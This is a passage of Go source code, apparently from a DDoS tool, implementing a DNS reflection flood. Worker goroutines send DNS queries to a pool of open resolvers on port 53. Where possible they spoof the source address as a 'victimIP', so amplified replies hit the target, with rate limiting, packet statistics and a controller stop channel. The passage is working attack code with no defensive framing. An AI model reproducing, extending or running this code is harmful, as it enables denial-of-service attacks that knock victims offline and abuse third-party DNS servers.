	}
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	entries := buildReflectorEntries(cfg.Targets, 53)
	if len(entries) == 0 {
		s.abort()
		return s
	}

	hot, entryByStr := startHotReflectorPool(entries)

	fallbackQueries := buildDNSQueryPool(cfg.PacketSize)

	domainQueries := make(map[string][]byte)
	for _, e := range entries {
		if e.domain != "" {
			if _, ok := domainQueries[e.domain]; !ok {
				domainQueries[e.domain] = buildDNSQueryForDomain(e.domain, cfg.PacketSize)
			}
		}
	}

	go func() {
		defer hot.Stop()
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int64) {
				defer wg.Done()

				var spoof *SpoofConn
				useSpoof := cfg.CanSpoofIP

				rng := NewFastRNG(time.Now().UnixNano() + seed)
				endTime := time.Now().Add(dur)

				var udpConn *net.UDPConn
				getConn := func() *net.UDPConn {
					if udpConn == nil {
						var err error
						udpConn, err = net.DialUDP("udp", nil, nil)
						if err != nil {
							return nil
						}
					}
					return udpConn
				}
				if !useSpoof {
					if getConn() == nil {
						atomic.AddUint64(&s.Stats.Errors, 1)
						return
					}
					defer udpConn.Close()
				}

				tc := newTimeCache()
				iter := 0
				active := hot.GetActive()

				for tc.since(endTime) < 0 {
					iter++
					select {
					case <-s.StopChan:
						return
					default:
					}

					if !s.checkRate(cfg.PacketSize) {
						time.Sleep(time.Microsecond * 100)
						continue
					}

					// 周期性刷新活跃列表，让热池健康检查的替换生效
					if iter%64 == 1 {
						active = hot.GetActive()
						if len(active) == 0 {
							time.Sleep(100 * time.Millisecond)
							continue
						}
					}
					refStr := active[rng.Intn(len(active))]
					ref := entryByStr[refStr]

					var q []byte
					if ref.domain != "" {
						q = domainQueries[ref.domain]
					}
					if q == nil && len(fallbackQueries) > 0 {
						q = fallbackQueries[rng.Intn(len(fallbackQueries))]
					}
					if q == nil {
						// 无可用查询（域名被 Controller 清空且反射器无内嵌域名）：
						// 空转紧循环会烧满 CPU，这里退避等待，后续循环可能
						// 因列表刷新拿到新查询
						time.Sleep(10 * time.Millisecond)
						continue
					}

					tc.refresh()

					var err error
					if useSpoof {
						if spoof == nil {
							spoof, err = NewSpoofConn(ref.addr.IP.String(), ref.addr.Port)
							if err != nil {
								useSpoof = false
								if getConn() == nil {
									atomic.AddUint64(&s.Stats.Errors, 1)
									return
								}
								continue
							}
							defer spoof.Close()
						}
						err = spoof.Send(victimIP, ref.addr.IP.String(), ref.addr.Port, q)
					} else {
						_, err = udpConn.WriteToUDP(q, ref.addr)
					}

					if err != nil {
						atomic.AddUint64(&s.Stats.Errors, 1)
						hot.RecordFailure(refStr)
					} else {
						atomic.AddUint64(&s.Stats.PacketsSent, 1)
						atomic.AddUint64(&s.Stats.BytesSent, uint64(len(q)))
					}
				}
			}(int64(i))
		}

		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()

	return s
}
